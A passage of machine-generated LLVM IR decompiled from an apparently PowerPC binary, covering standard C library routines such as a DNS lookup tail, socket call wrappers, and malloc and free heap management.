  store i32 %v0_100056e8, i32* %r3.global-to-local, align 4
  %v2_100056f8 = ptrtoint i32* %stack_var_-120 to i32
  %v2_100056fc = ptrtoint i32* %stack_var_-100 to i32
  %v0_10005700 = load i32, i32* %r22.global-to-local, align 4
  store i32 268457744, i32* @lr, align 4
  %v6_1000570c = inttoptr i32 %v0_100056e8 to i8*
  %v7_1000570c = call i32 @__dns_lookup(i8* %v6_1000570c, i32 1, i32 %v3_100056d4, i32 ptrtoint (i32* @global_var_1001ff04.387 to i32), i32 %v2_100056f8, i32 %v2_100056fc)
  store i32 %v7_1000570c, i32* %r3.global-to-local, align 4
  %v1_10005710 = icmp slt i32 %v7_1000570c, 0
  br i1 %v1_10005710, label %dec_label_pc_10005858, label %dec_label_pc_10005718

dec_label_pc_10005718:                            ; preds = %dec_label_pc_100056a4
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10005720 = add i32 %tmp19, 4
  %v2_10005724 = mul i32 %v0_10005700, %v1_10005720
  %v1_10005728 = add i32 %v2_10005724, 256
  %v1_1000572c = load i32, i32* @r27, align 4
  %v3_1000572c = icmp ugt i32 %v1_10005728, %v1_1000572c
  br i1 %v3_1000572c, label %dec_label_pc_10005734, label %dec_label_pc_10005750

dec_label_pc_10005734:                            ; preds = %dec_label_pc_10005718
  %v3_10005734 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10005734, i32* @r3, align 4
  store i32 268457788, i32* @lr, align 4
  %v0_10005738 = call i32 @free()
  %v3_1000573c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000573c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005744.388 to i32), i32* @lr, align 4
  %v0_10005740 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_10005748 = load i32, i32* @r19, align 4
  %v1_10005748 = load i32, i32* @r24, align 4
  %v2_10005748 = inttoptr i32 %v1_10005748 to i32*
  store i32 %v0_10005748, i32* %v2_10005748, align 4
  br label %dec_label_pc_10005878

dec_label_pc_10005750:                            ; preds = %dec_label_pc_10005718
  %v3_10005750 = icmp eq i32 %v0_10005700, 0
  br i1 %v3_10005750, label %dec_label_pc_10005750.dec_label_pc_100057f4_crit_edge, label %dec_label_pc_10005758

dec_label_pc_10005750.dec_label_pc_100057f4_crit_edge: ; preds = %dec_label_pc_10005750
  %v0_100057fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100057f4

dec_label_pc_10005758:                            ; preds = %dec_label_pc_10005750
  %v2_10005758 = mul i32 %v0_10005700, %tmp19
  store i32 %v2_10005758, i32* @r5, align 4
  %v0_1000575c = load i32, i32* @r30, align 4
  %v1_1000575c = add i32 %v0_1000575c, 36
  store i32 %v1_1000575c, i32* %r3.global-to-local, align 4
  %v0_10005760 = load i32, i32* @r31, align 4
  store i32 268457832, i32* @lr, align 4
  %v2_10005764 = call i32 @memmove(i32 %v1_1000575c, i32 %v0_10005760)
  store i32 %v2_10005764, i32* %r3.global-to-local, align 4
  store i32 %v2_10005758, i32* %r0.global-to-local, align 4
  %v0_10005774 = load i32, i32* @r30, align 4
  %v1_10005774 = load i32, i32* @r31, align 4
  %v3_10005774 = add i32 %v1_10005774, %v2_10005758
  %v4_10005774 = inttoptr i32 %v3_10005774 to i32*
  store i32 %v0_10005774, i32* %v4_10005774, align 4
  %v0_10005778 = load i32, i32* @r31, align 4
  %v1_10005778 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005778 = add i32 %v1_10005778, %v0_10005778
  store i32 %v2_10005778, i32* @r25, align 4
  %v1_10005780 = add i32 %v0_10005700, -1
  store i32 %v1_10005780, i32* %r11.global-to-local, align 4
  %v1_10005784 = add i32 %v0_10005700, 1
  %v2_10005788 = icmp sgt i32 %v1_10005780, -1
  store i32 %v1_10005784, i32* %ctr.global-to-local, align 4
  br i1 %v2_10005788, label %dec_label_pc_100057b8.preheader, label %dec_label_pc_10005794

dec_label_pc_10005794:                            ; preds = %dec_label_pc_10005758
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100057b8.preheader

dec_label_pc_100057b8.preheader:                  ; preds = %dec_label_pc_10005794, %dec_label_pc_10005758
  %v0_100057c06 = phi i32 [ 1, %dec_label_pc_10005794 ], [ %v1_10005784, %dec_label_pc_10005758 ]
  %v1_100057b83 = mul i32 %v1_10005780, 4
  store i32 %v1_100057b83, i32* %r0.global-to-local, align 4
  %v2_100057bc5 = add i32 %v2_10005778, %v1_100057b83
  %v1_100057c07 = add i32 %v0_100057c06, -1
  store i32 %v1_100057c07, i32* %ctr.global-to-local, align 4
  %v2_100057c08 = icmp eq i32 %v1_100057c07, 0
  br i1 %v2_100057c08, label %dec_label_pc_100057c4, label %dec_label_pc_100057a0

dec_label_pc_100057a0:                            ; preds = %dec_label_pc_100057b8.preheader, %dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge
  %v1_100057b4 = phi i32 [ %v2_100057bc, %dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge ], [ %v2_100057bc5, %dec_label_pc_100057b8.preheader ]
  %v0_100057ac = phi i32 [ %v0_100057ac.pre, %dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge ], [ %v0_10005778, %dec_label_pc_100057b8.preheader ]
  %v0_100057a4 = phi i32 [ %v0_100057b8, %dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge ], [ %v1_10005780, %dec_label_pc_100057b8.preheader ]
  %v2_100057a4 = mul i32 %v0_100057a4, %tmp19
  %v1_100057a8 = add i32 %v0_100057a4, -1
  store i32 %v1_100057a8, i32* %r11.global-to-local, align 4
  %v2_100057ac = add i32 %v0_100057ac, -8
  %v1_100057b0 = add i32 %v2_100057ac, %v2_100057a4
  %v2_100057b4 = add i32 %v1_100057b4, 4
  %v3_100057b4 = inttoptr i32 %v2_100057b4 to i32*
  store i32 %v1_100057b0, i32* %v3_100057b4, align 4
  %v0_100057b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100057b8 = mul i32 %v0_100057b8, 4
  store i32 %v1_100057b8, i32* %r0.global-to-local, align 4
  %v1_100057bc = load i32, i32* @r25, align 4
  %v0_100057c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100057c0 = add i32 %v0_100057c0, -1
  store i32 %v1_100057c0, i32* %ctr.global-to-local, align 4
  %v2_100057c0 = icmp eq i32 %v1_100057c0, 0
  br i1 %v2_100057c0, label %dec_label_pc_100057c4, label %dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge

dec_label_pc_100057a0.dec_label_pc_100057a0_crit_edge: ; preds = %dec_label_pc_100057a0
  %v2_100057bc = add i32 %v1_100057bc, %v1_100057b8
  %v0_100057ac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100057a0

dec_label_pc_100057c4:                            ; preds = %dec_label_pc_100057a0, %dec_label_pc_100057b8.preheader
  %v1_100057d0 = phi i32 [ %v2_10005778, %dec_label_pc_100057b8.preheader ], [ %v1_100057bc, %dec_label_pc_100057a0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100057cc = mul i32 %v0_10005700, 4
  %v2_100057d0 = add i32 %v1_100057cc, 4
  %v2_100057d4 = add i32 %v2_100057d0, %v1_100057d0
  %v3_100057d4 = inttoptr i32 %v2_100057d4 to i32*
  store i32 0, i32* %v3_100057d4, align 4
  %v0_100057e0 = load i32, i32* @r25, align 4
  %v2_100057e0 = add i32 %v0_100057e0, %v1_100057cc
  store i32 %v2_100057e0, i32* %r11.global-to-local, align 4
  %v1_100057e4 = load i32, i32* @r31, align 4
  %v2_100057e4 = sub i32 %v1_100057e4, %v2_100057e0
  %v1_100057e8 = add i32 %v2_100057e0, 8
  store i32 %v1_100057e8, i32* @r31, align 4
  %v0_100057ec = load i32, i32* @r27, align 4
  %v2_100057ec = add i32 %v0_100057ec, %v2_100057e4
  %v1_100057f0 = add i32 %v2_100057ec, -8
  br label %dec_label_pc_100057f4

dec_label_pc_100057f4:                            ; preds = %dec_label_pc_10005750.dec_label_pc_100057f4_crit_edge, %dec_label_pc_100057c4
  %v0_100057fc = phi i32 [ %v0_100057fc.pre, %dec_label_pc_10005750.dec_label_pc_100057f4_crit_edge ], [ %v1_100057e8, %dec_label_pc_100057c4 ]
  %v0_100057f8 = phi i32 [ %v1_1000572c, %dec_label_pc_10005750.dec_label_pc_100057f4_crit_edge ], [ %v1_100057f0, %dec_label_pc_100057c4 ]
  %v3_100057f4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_100057f4, i32* @r4, align 4
  store i32 %v0_100057fc, i32* %r3.global-to-local, align 4
  store i32 268457988, i32* @lr, align 4
  %v3_10005800 = call i32 @strncpy(i32 %v0_100057fc, i32 %v3_100057f4, i32 %v0_100057f8)
  %v3_10005804 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10005804, i32* @r3, align 4
  store i32 268457996, i32* @lr, align 4
  %v0_10005808 = call i32 @free()
  store i32 %v0_10005808, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10005810 = icmp eq i32 %tmp18, 1
  br i1 %v3_10005810, label %dec_label_pc_10005818, label %dec_label_pc_10005860

dec_label_pc_10005818:                            ; preds = %dec_label_pc_100057f4
  store i32 4, i32* @r5, align 4
  %v0_10005820 = load i32, i32* @r30, align 4
  store i32 %v0_10005820, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005828.389 to i32), i32* @lr, align 4
  %v0_10005824 = call i32 @memcpy()
  %v1_1000582c = load i32, i32* @r26, align 4
  %v2_1000582c = add i32 %v1_1000582c, 8
  %v3_1000582c = inttoptr i32 %v2_1000582c to i32*
  store i32 2, i32* %v3_1000582c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10005834 = load i32, i32* @r26, align 4
  %v2_10005834 = add i32 %v1_10005834, 12
  %v3_10005834 = inttoptr i32 %v2_10005834 to i32*
  store i32 4, i32* %v3_10005834, align 4
  %v0_10005838 = load i32, i32* @r31, align 4
  %v1_10005838 = load i32, i32* @r26, align 4
  %v2_10005838 = inttoptr i32 %v1_10005838 to i32*
  store i32 %v0_10005838, i32* %v2_10005838, align 4
  %v0_1000583c = load i32, i32* @r25, align 4
  %v1_1000583c = load i32, i32* @r26, align 4
  %v2_1000583c = add i32 %v1_1000583c, 16
  %v3_1000583c = inttoptr i32 %v2_1000583c to i32*
  store i32 %v0_1000583c, i32* %v3_1000583c, align 4
  %v0_10005840 = load i32, i32* @r21, align 4
  %v1_10005840 = load i32, i32* @r26, align 4
  %v2_10005840 = add i32 %v1_10005840, 4
  %v3_10005840 = inttoptr i32 %v2_10005840 to i32*
  store i32 %v0_10005840, i32* %v3_10005840, align 4
  %v3_10005844 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10005844, i32* @r3, align 4
  store i32 268458060, i32* @lr, align 4
  %v0_10005848 = call i32 @free()
  store i32 %v0_10005848, i32* %r3.global-to-local, align 4
  %v0_1000584c = load i32, i32* @r26, align 4
  %v1_1000584c = load i32, i32* @r20, align 4
  %v2_1000584c = inttoptr i32 %v1_1000584c to i32*
  store i32 %v0_1000584c, i32* %v2_1000584c, align 4
  br label %dec_label_pc_10005858

dec_label_pc_10005858:                            ; preds = %dec_label_pc_10005860, %dec_label_pc_100056a4, %dec_label_pc_10005818
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10005818 ], [ 2, %dec_label_pc_100056a4 ], [ 2, %dec_label_pc_10005860 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10005818 ], [ 1, %dec_label_pc_100056a4 ], [ 1, %dec_label_pc_10005860 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_10005858 = load i32, i32* @r24, align 4
  %v2_10005858 = inttoptr i32 %v1_10005858 to i32*
  store i32 %storemerge, i32* %v2_10005858, align 4
  br label %dec_label_pc_10005878

dec_label_pc_10005860:                            ; preds = %dec_label_pc_100057f4
  %v3_10005860 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10005860, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005868.390 to i32), i32* @lr, align 4
  %v0_10005864 = call i32 @free()
  store i32 %v0_10005864, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005858

dec_label_pc_10005874:                            ; preds = %dec_label_pc_10005638, %dec_label_pc_1000561c, %dec_label_pc_10005610, %dec_label_pc_10005600, %dec_label_pc_100055f0
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005878

dec_label_pc_10005878:                            ; preds = %dec_label_pc_100055d4, %dec_label_pc_100055cc, %dec_label_pc_10005580, %entry, %dec_label_pc_10005858, %dec_label_pc_10005734, %dec_label_pc_10005678, %dec_label_pc_10005874
  store i32 %v0_1000554c, i32* %r0.global-to-local, align 4
  %v0_10005888 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10005888

; uselistorder directives
  uselistorder i32 %v0_100057fc, { 1, 0 }
  uselistorder i32 %v1_100057cc, { 1, 0 }
  uselistorder i32 %v1_100057c0, { 1, 0 }
  uselistorder i32 %v1_100057b8, { 1, 0 }
  uselistorder i32 %v0_100057a4, { 1, 0 }
  uselistorder i32 %v1_100057b83, { 1, 0 }
  uselistorder i32 %v1_10005780, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10005778, { 1, 0, 2 }
  uselistorder i32 %v0_10005700, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_10005644, { 1, 0, 2 }
  uselistorder i32 %v0_10005600.pre, { 0, 2, 1 }
  uselistorder i32 %v1_100055e8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10005878, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10005858, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100057f4, { 1, 0 }
  uselistorder label %dec_label_pc_100057a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005600, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100058a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458160, i32* @lr, align 4
  %v2_100058ac = call i32 @__socketcall(i32 5, i32 %v2_100058a0)
  ret i32 %v2_100058ac

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100058d4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458212, i32* @lr, align 4
  %v2_100058e0 = call i32 @__socketcall(i32 2, i32 %v2_100058d4)
  ret i32 %v2_100058e0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10005908 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458264, i32* @lr, align 4
  %v2_10005914 = call i32 @__socketcall(i32 3, i32 %v2_10005908)
  ret i32 %v2_10005914

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000593c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458312, i32* @lr, align 4
  %v2_10005944 = call i32 @__socketcall(i32 4, i32 %v2_1000593c)
  ret i32 %v2_10005944

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000596c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458368, i32* @lr, align 4
  %v2_1000597c = call i32 @__socketcall(i32 10, i32 %v2_1000596c)
  ret i32 %v2_1000597c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100059a4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458424, i32* @lr, align 4
  %v2_100059b4 = call i32 @__socketcall(i32 9, i32 %v2_100059a4)
  ret i32 %v2_100059b4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_100059dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268458488, i32* @lr, align 4
  %v2_100059f4 = call i32 @__socketcall(i32 11, i32 %v2_100059dc)
  ret i32 %v2_100059f4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10005a1c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268458548, i32* @lr, align 4
  %v2_10005a30 = call i32 @__socketcall(i32 14, i32 %v2_10005a1c)
  ret i32 %v2_10005a30

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10005a58 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458600, i32* @lr, align 4
  %v2_10005a64 = call i32 @__socketcall(i32 1, i32 %v2_10005a58)
  ret i32 %v2_10005a64

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 8, 0, 3, 4, 7, 2, 6, 5 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10005a80 = load i32, i32* @r3, align 4
  %v3_10005a80 = icmp eq i32 %v0_10005a80, 0
  br i1 %v3_10005a80, label %dec_label_pc_10005a90, label %dec_label_pc_10005a94

dec_label_pc_10005a90:                            ; preds = %entry
  br label %dec_label_pc_10005a94

dec_label_pc_10005a94:                            ; preds = %entry, %dec_label_pc_10005a90
  %v0_10005aa4 = phi i32 [ 1, %dec_label_pc_10005a90 ], [ %v0_10005a80, %entry ]
  %v3_10005a98 = icmp ugt i32 %v0_10005aa4, -8
  br i1 %v3_10005a98, label %dec_label_pc_10005ba8, label %dec_label_pc_10005aa0

dec_label_pc_10005aa0:                            ; preds = %dec_label_pc_10005a94
  %v1_10005aa4 = add i32 %v0_10005aa4, 4
  store i32 ptrtoint (i32* @global_var_1001feac.391 to i32), i32* @r29, align 4
  store i32 %v1_10005aa4, i32* %stack_var_-40, align 4
  %v0_10005ab4 = call i32 @__pthread_return_0()
  %v2_10005abc = ptrtoint i32* %stack_var_-40 to i32
  %v3_10005ac4 = call i32 @__heap_alloc(i32* inttoptr (i32 268556300 to i32*), i32 %v2_10005abc)
  store i32 %v3_10005ac4, i32* %r31.global-to-local, align 4
  %v0_10005ad0 = call i32 @__pthread_return_0()
  %v3_10005ad4 = icmp eq i32 %v3_10005ac4, 0
  br i1 %v3_10005ad4, label %dec_label_pc_10005adc, label %dec_label_pc_10005b8c.thread

dec_label_pc_10005b8c.thread:                     ; preds = %dec_label_pc_10005aa0
  br label %dec_label_pc_10005ba0

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005aa0
  %v3_10005ae0 = load i32, i32* @global_var_1001d87c.340, align 4
  store i32 %v3_10005ae0, i32* %r31.global-to-local, align 4
  %v3_10005ae4 = load i32, i32* %stack_var_-40, align 4
  %v2_10005ae8 = icmp ult i32 %v3_10005ae4, %v3_10005ae0
  br i1 %v2_10005ae8, label %dec_label_pc_10005b00, label %dec_label_pc_10005af0

dec_label_pc_10005af0:                            ; preds = %dec_label_pc_10005adc
  %v1_10005af4 = sub i32 0, %v3_10005ae0
  %v2_10005af0 = add i32 %v3_10005ae0, -1
  %v1_10005af8 = add i32 %v2_10005af0, %v3_10005ae4
  %v2_10005afc = and i32 %v1_10005af8, %v1_10005af4
  store i32 %v2_10005afc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b00

dec_label_pc_10005b00:                            ; preds = %dec_label_pc_10005adc, %dec_label_pc_10005af0
  %v0_10005b0c = call i32 @__pthread_return_0()
  %v0_10005b10 = load i32, i32* %r31.global-to-local, align 4
  store i32 268458776, i32* @lr, align 4
  %v1_10005b14 = call i32 @__GI_sbrk(i32 %v0_10005b10)
  %v3_10005b18 = icmp eq i32 %v1_10005b14, -1
  br i1 %v3_10005b18, label %dec_label_pc_10005b38, label %dec_label_pc_10005b20

dec_label_pc_10005b20:                            ; preds = %dec_label_pc_10005b00
  %v1_10005b20 = add i32 %v1_10005b14, 3
  %v1_10005b24 = call i32 @__asm_rlwinm(i32 %v1_10005b20, i32 0, i32 0, i32 29)
  store i32 %v1_10005b24, i32* @r30, align 4
  %v4_10005b28 = icmp eq i32 %v1_10005b24, %v1_10005b14
  br i1 %v4_10005b28, label %dec_label_pc_10005b38, label %dec_label_pc_10005b30

dec_label_pc_10005b30:                            ; preds = %dec_label_pc_10005b20
  %v2_10005b30 = sub i32 %v1_10005b24, %v1_10005b14
  store i32 268458808, i32* @lr, align 4
  %v1_10005b34 = call i32 @__GI_sbrk(i32 %v2_10005b30)
  br label %dec_label_pc_10005b38

dec_label_pc_10005b38:                            ; preds = %dec_label_pc_10005b20, %dec_label_pc_10005b00, %dec_label_pc_10005b30
  %v0_10005b40 = call i32 @__pthread_return_0()
  %v0_10005b44 = load i32, i32* @r30, align 4
  %v3_10005b44 = icmp eq i32 %v0_10005b44, -1
  br i1 %v3_10005b44, label %dec_label_pc_10005ba8, label %dec_label_pc_10005b8c

dec_label_pc_10005b8c:                            ; preds = %dec_label_pc_10005b38
  store i32 ptrtoint (i32* @global_var_1001feac.391 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001d80c to i32), i32* @r29, align 4
  %v0_10005b60 = call i32 @__pthread_return_0()
  %v0_10005b64 = load i32, i32* @r31, align 4
  %v0_10005b68 = load i32, i32* @r30, align 4
  %v0_10005b6c = load i32, i32* @r29, align 4
  store i32 268458868, i32* @lr, align 4
  %v3_10005b70 = inttoptr i32 %v0_10005b6c to i32*
  %v4_10005b70 = call i32 @__heap_free(i32* %v3_10005b70, i32 %v0_10005b68, i32 %v0_10005b64)
  %v0_10005b74 = load i32, i32* @r29, align 4
  %v2_10005b7c = inttoptr i32 %v0_10005b74 to i32*
  %v3_10005b7c = call i32 @__heap_alloc(i32* %v2_10005b7c, i32 %v2_10005abc)
  store i32 %v3_10005b7c, i32* %r31.global-to-local, align 4
  %v0_10005b88 = call i32 @__pthread_return_0()
  %v3_10005b8c = icmp eq i32 %v3_10005b7c, 0
  br i1 %v3_10005b8c, label %dec_label_pc_10005ba0.thread, label %dec_label_pc_10005ba0

dec_label_pc_10005ba0.thread:                     ; preds = %dec_label_pc_10005b8c
  br label %dec_label_pc_10005ba8

dec_label_pc_10005ba0:                            ; preds = %dec_label_pc_10005b8c, %dec_label_pc_10005b8c.thread
  %v0_10005ba0.pr6 = phi i32 [ %v3_10005ac4, %dec_label_pc_10005b8c.thread ], [ %v3_10005b7c, %dec_label_pc_10005b8c ]
  %v3_10005b94 = load i32, i32* %stack_var_-40, align 4
  %v2_10005b98 = inttoptr i32 %v0_10005ba0.pr6 to i32*
  store i32 %v3_10005b94, i32* %v2_10005b98, align 4
  %v0_10005b9c = load i32, i32* %r31.global-to-local, align 4
  %v1_10005b9c = add i32 %v0_10005b9c, 4
  store i32 %v1_10005b9c, i32* @r31, align 4
  %v3_10005ba0 = icmp eq i32 %v1_10005b9c, 0
  br i1 %v3_10005ba0, label %dec_label_pc_10005ba8, label %dec_label_pc_10005bb8

dec_label_pc_10005ba8:                            ; preds = %dec_label_pc_10005ba0.thread, %dec_label_pc_10005ba0, %dec_label_pc_10005b38, %dec_label_pc_10005a94
  %v0_10005ba8 = call i32 @__errno_location()
  %v2_10005bb0 = inttoptr i32 %v0_10005ba8 to i32*
  store i32 12, i32* %v2_10005bb0, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10005bb8

dec_label_pc_10005bb8:                            ; preds = %dec_label_pc_10005ba0, %dec_label_pc_10005ba8
  %v0_10005bbc = phi i32 [ %v1_10005b9c, %dec_label_pc_10005ba0 ], [ 0, %dec_label_pc_10005ba8 ]
  ret i32 %v0_10005bbc

; uselistorder directives
  uselistorder i32 %v1_10005b9c, { 1, 0, 2 }
  uselistorder i32 %v1_10005b24, { 1, 0, 2 }
  uselistorder i32 %v1_10005b14, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10005ae0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10005ac4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_10005bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10005ba8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10005b38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b00, { 1, 0 }
  uselistorder label %dec_label_pc_10005a94, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_10005bd8 = load i32, i32* @r3, align 4
  %v3_10005bd8 = icmp eq i32 %v0_10005bd8, 0
  br i1 %v3_10005bd8, label %dec_label_pc_10005cbc, label %dec_label_pc_10005be8

dec_label_pc_10005be8:                            ; preds = %entry
  %v1_10005bec = add i32 %v0_10005bd8, -4
  %v2_10005bec = inttoptr i32 %v1_10005bec to i32*
  %v3_10005bec = load i32, i32* %v2_10005bec, align 4
  store i32 %v3_10005bec, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_10005c00 = call i32 @__pthread_return_0()
  %v0_10005c08 = load i32, i32* @r28, align 4
  store i32 268459028, i32* @lr, align 4
  %v4_10005c10 = call i32 @__heap_free(i32* nonnull @global_var_1001d80c, i32 %v1_10005bec, i32 %v0_10005c08)
  %v3_10005c18 = load i32, i32* @global_var_1001d87c.340, align 4
  store i32 %v4_10005c10, i32* @r29, align 4
  %v1_10005c20 = inttoptr i32 %v4_10005c10 to i32*
  %v2_10005c20 = load i32, i32* %v1_10005c20, align 4
  store i32 %v2_10005c20, i32* @r27, align 4
  %v1_10005c24 = mul i32 %v3_10005c18, 8
  %v2_10005c28 = icmp ult i32 %v2_10005c20, %v1_10005c24
  br i1 %v2_10005c28, label %dec_label_pc_10005c5c, label %dec_label_pc_10005c30

dec_label_pc_10005c30:                            ; preds = %dec_label_pc_10005be8
  store i32 ptrtoint (i32* @global_var_1001fedc.394 to i32), i32* @r28, align 4
  %v0_10005c40 = call i32 @__pthread_return_0()
  store i32 268459084, i32* @lr, align 4
  %v1_10005c48 = call i32 @__GI_sbrk(i32 0)
  %v0_10005c4c = load i32, i32* @r31, align 4
  %v4_10005c4c = icmp eq i32 %v0_10005c4c, %v1_10005c48
  br i1 %v4_10005c4c, label %dec_label_pc_10005c64, label %dec_label_pc_10005c54

dec_label_pc_10005c54:                            ; preds = %dec_label_pc_10005c30
  %v0_10005c58 = call i32 @__pthread_return_0()
  br label %dec_label_pc_10005c5c

dec_label_pc_10005c5c:                            ; preds = %dec_label_pc_10005be8, %dec_label_pc_10005c54
  br label %dec_label_pc_10005cb8

dec_label_pc_10005c64:                            ; preds = %dec_label_pc_10005c30
  %v0_10005c64 = load i32, i32* @r29, align 4
  %v1_10005c64 = add i32 %v0_10005c64, 4
  %v2_10005c64 = inttoptr i32 %v1_10005c64 to i32*
  %v3_10005c64 = load i32, i32* %v2_10005c64, align 4
  %v3_10005c68 = icmp eq i32 %v3_10005c64, 0
  br i1 %v3_10005c68, label %dec_label_pc_10005c78, label %dec_label_pc_10005c70

dec_label_pc_10005c70:                            ; preds = %dec_label_pc_10005c64
  %v1_10005c70 = add i32 %v0_10005c64, 8
  %v2_10005c70 = inttoptr i32 %v1_10005c70 to i32*
  %v3_10005c70 = load i32, i32* %v2_10005c70, align 4
  %v2_10005c74 = add i32 %v3_10005c64, 8
